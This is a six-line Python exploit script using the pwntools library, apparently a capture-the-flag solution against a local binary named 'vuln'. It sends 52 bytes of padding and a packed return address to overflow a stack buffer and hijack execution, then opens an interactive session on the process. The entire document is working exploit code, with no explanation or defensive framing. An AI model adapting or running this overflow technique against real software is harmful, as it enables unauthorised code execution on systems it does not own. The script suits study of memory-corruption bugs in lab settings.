from pwn import *        
p = process('./vuln')    
payload = b'A' * 52
payload += p32(0x080491c3)
p.sendline(payload)
p.interactive()